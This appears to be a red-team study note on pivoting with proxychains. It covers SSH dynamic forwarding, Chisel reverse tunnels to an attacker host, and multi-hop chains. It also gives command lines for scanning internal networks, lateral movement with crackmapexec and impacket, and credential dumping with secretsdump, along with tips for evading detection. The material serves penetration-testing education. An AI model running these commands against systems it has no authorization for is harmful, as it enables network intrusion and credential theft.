---
tags: [tools, ad, pivoting, vapt]
difficulty: advanced
module: "59 - Complete Tools Reference"
topic: "59.56 proxychains SOCKS Proxy Chaining"
---

# Proxychains: Advanced SOCKS Proxy Chaining and Pivoting

Proxychains is an open-source tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy. Supported auth-types: "user/pass" for SOCKS4/5, "basic" for HTTP.

In offensive security, Red Teams and Penetration Testers frequently utilize proxychains in combination with SSH dynamic port forwarding, Chisel, or Ligolo-ng to interact with internal targets not directly reachable from the attacker's infrastructure. By dynamically routing standard command-line tools (like Nmap, crackmapexec, impacket) through established proxy tunnels, attackers extend their reach deep into segregated networks.

## Core Concepts and Architecture

At its core, proxychains uses `LD_PRELOAD` trick on Linux to hook network-related libc functions (`connect`, `send`, `recv`, etc.) and redirect the traffic to the specified proxy servers.

### ASCII Architecture Diagram

```text
+---------------------+
| Attacker Machine    |
|                     |
|  [Nmap / Metasploit]|
|          |          |
|    (Proxychains)    |
|          |          |
|    [Local Port]     |
|      127.0.0.1:9050 |
+----------+----------+
           |
           | (Encrypted SSH / Chisel Tunnel)
           |
+----------v----------+                     +-----------------------+
| Compromised Host    |                     | Target Internal Host  |
| (Pivot / Jump Box)  |                     | (No Direct Internet)  |
|                     |                     |                       |
|   [SOCKS Proxy]     |-----(Raw TCP)------>|   Port 445 (SMB)      |
|   Port 9050         |                     |   Port 3389 (RDP)     |
+---------------------+                     +-----------------------+
```

## Installation and Configuration

Proxychains is pre-installed on most penetration testing distributions (Kali Linux, Parrot OS). Alternatively, it can be installed from source or package managers.

```bash
# Debian/Ubuntu
sudo apt install proxychains4
```

The primary configuration file is located at `/etc/proxychains4.conf`. It is highly recommended to make a local copy of this configuration file in your working directory (`./proxychains.conf`), as proxychains will read the configuration in the following order:
1. File listed in environment variable `PROXYCHAINS_CONF_FILE`
2. `./proxychains.conf`
3. `~/.proxychains/proxychains.conf`
4. `/etc/proxychains4.conf`

## Configuration Directives

The configuration file allows for different chaining mechanisms:

### Chaining Options

- **dynamic_chain**: Proxychains will read proxies from the list and chain them. Dead proxies are skipped. This is the most reliable method when dealing with unstable networks or multiple pivot points.
- **strict_chain**: All proxies in the list will be chained in the exact order they appear. If any proxy in the chain goes down or is unresponsive, the entire connection fails. Useful for enforcing a specific egress path.
- **round_robin_chain**: Proxies are used in a round-robin fashion. Mostly used for load balancing or avoiding IP-based rate limiting.
- **random_chain**: Each connection will be done via a random proxy (or proxy chain) from the list. This option is beneficial for evasion or when scraping data to avoid blacklisting.

### DNS Resolution

DNS leaks are a significant concern when pivoting. By default, proxychains attempts to proxy DNS requests (TCP over SOCKS).

- **proxy_dns**: (Default: uncommented). Proxies DNS requests through the proxy. Important to prevent DNS queries from leaking on the attacker's primary interface, which could alert the target's SOC.

### Proxy List Format

The `[ProxyList]` section defines the proxies to be used.

Format: `type  host  port  [user  pass]`

```ini
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050

# Example Chisel SOCKS5 pivot
socks5  127.0.0.1 1080

# Example SSH dynamic port forwarding with authentication
socks5  127.0.0.1 9050  username  password

# Example HTTP proxy
http    192.168.1.100 8080
```

## Advanced Usage and Operational Scenarios

### 1. Pivoting via SSH Dynamic Port Forwarding

The most common baseline pivoting technique.

1.  **Establish the tunnel:** Use SSH to connect to a compromised jump host, opening a local SOCKS port.
    ```bash
    ssh -D 9050 -q -C -N user@jump_host_ip
    ```
    - `-D 9050`: Opens a SOCKS proxy on local port 9050.
    - `-q`: Quiet mode.
    - `-C`: Compression.
    - `-N`: Do not execute a remote command (just forward ports).

2.  **Configure proxychains:** Ensure `./proxychains.conf` has:
    ```ini
    socks5 127.0.0.1 9050
    ```

3.  **Execute tools:** Route traffic through the tunnel.
    ```bash
    proxychains -q nmap -sT -Pn -p 445,3389,80 10.10.10.0/24
    proxychains -q crackmapexec smb 10.10.10.5 -u 'admin' -p 'Password123'
    ```

### 2. Pivoting via Chisel

Chisel is an incredibly fast TCP/UDP tunnel over HTTP, heavily used when SSH is unavailable.

1.  **Start Chisel Server (Attacker):**
    ```bash
    chisel server -p 8000 --reverse
    ```

2.  **Start Chisel Client (Target Box):**
    ```powershell
    # Windows
    .\chisel.exe client attacker_ip:8000 R:socks
    ```

3.  **Configure proxychains:** Chisel defaults to port 1080 for the SOCKS proxy.
    ```ini
    socks5 127.0.0.1 1080
    ```

4.  **Execute tools:**
    ```bash
    proxychains -q rdesktop 10.10.20.15
    proxychains -q impacket-wmiexec DOMAIN/user:password@10.10.20.15
    ```

### 3. Nmap Scanning Limitations over Proxychains

When using Nmap through proxychains, it's critical to understand that **ICMP and half-open SYN scans (`-sS`) do NOT work**. SOCKS proxies only support full TCP connections.

-   **Must use TCP Connect Scan:** `-sT`
-   **Must disable Ping (ICMP):** `-Pn`
-   **Concurrency tuning:** Proxies can be easily overwhelmed by Nmap's default speeds.
    ```bash
    proxychains -q nmap -sT -Pn --max-retries 1 --max-scan-delay 20 --connect-timeout 2000 -p 135,139,445 10.x.x.x
    ```

### 4. Bypassing Restrictions with Quiet Mode

Proxychains can generate verbose output, cluttering the terminal. Use `-q` to suppress proxychains' native logging and only see the output of the tool being executed.

```bash
proxychains -q impacket-secretsdump domain.local/admin:pass@10.10.10.10
```

## Chaining Proxies (Multi-Pivot)

In sophisticated network topologies, you may need to traverse multiple segregated subnets.

Example Topology:
Attacker -> JumpBox1 (10.0.0.5) -> JumpBox2 (10.0.1.5) -> Target (10.0.2.10)

1.  **Tunnel 1:** Attacker to JumpBox1 (Local port 9050)
    ```bash
    ssh -D 9050 user1@10.0.0.5
    ```
2.  **Tunnel 2:** JumpBox1 to JumpBox2 (Local port 9051)
    *From Attacker machine*, route the second SSH connection *through* the first tunnel.
    ```bash
    proxychains ssh -D 9051 user2@10.0.1.5
    ```
3.  **Configure proxychains:** Set to `strict_chain` or `dynamic_chain`.
    ```ini
    [ProxyList]
    socks5 127.0.0.1 9050
    socks5 127.0.0.1 9051
    ```
4.  **Access Target:**
    ```bash
    proxychains nmap -sT -Pn 10.0.2.10
    ```

## Tool Compatibility Matrix

| Tool | Works over Proxychains? | Notes |
| :--- | :--- | :--- |
| Nmap | Partial | Only `-sT -Pn` works. No UDP, no OS detection, limited script functionality. |
| Impacket | Yes | All scripts (`psexec`, `smbexec`, `secretsdump`) work flawlessly. |
| CrackMapExec / NetExec | Yes | Excellent for lateral movement. Use `-q` flag on proxychains. |
| Metasploit | Yes | Launch `proxychains msfconsole` to route all module traffic. |
| BloodHound (Python) | Yes | `proxychains bloodhound-python ...` works perfectly. |
| Burp Suite | Yes | Launch `proxychains burpsuite` to proxy web traffic into internal networks. |
| RDP (xfreerdp) | Yes | Works well for GUI access to internal Windows boxes. |
| Evil-WinRM | Yes | `proxychains evil-winrm -i ...` is fully supported. |
| Responder | No | Responder relies on UDP broadcasts and multicast (LLMNR, NBT-NS), which SOCKS cannot route. |

## Troubleshooting and Pitfalls

-   **"socket error or timeout!"**: Often indicates the target is unreachable, the port is filtered by a host firewall, or the proxy connection is unstable. Increase timeouts in `.conf`.
-   **UDP Traffic Fails**: SOCKS4 does not support UDP. SOCKS5 supports UDP technically, but many proxy servers (like SSH `-D`) do not implement UDP relay. If UDP pivoting is strictly required, use Ligolo-ng, VPNs, or specific UDP-over-TCP wrappers.
-   **DNS Resolution Fails**: If you cannot resolve internal AD domain names (e.g., `corp.local`), modify your `/etc/hosts` file locally, or ensure `proxy_dns` is active and the target DNS server is queried explicitly by the tool.

## Chaining Opportunities
- Use proxychains to execute [[59 - Impacket All Scripts]] into segregated networks.
- Forward traffic for [[60 - CrackMapExec NetExec Full Command Reference]] during lateral movement.
- Gather Active Directory data internally using [[58 - SharpHound Data Collection for BloodHound]] or BloodHound-Python routed via proxychains.

## Related Notes
- [[04 - Network Pivoting and Tunneling]]
- [[21 - Active Directory Enumeration]]
- [[44 - Bypassing Network Segmentation]]
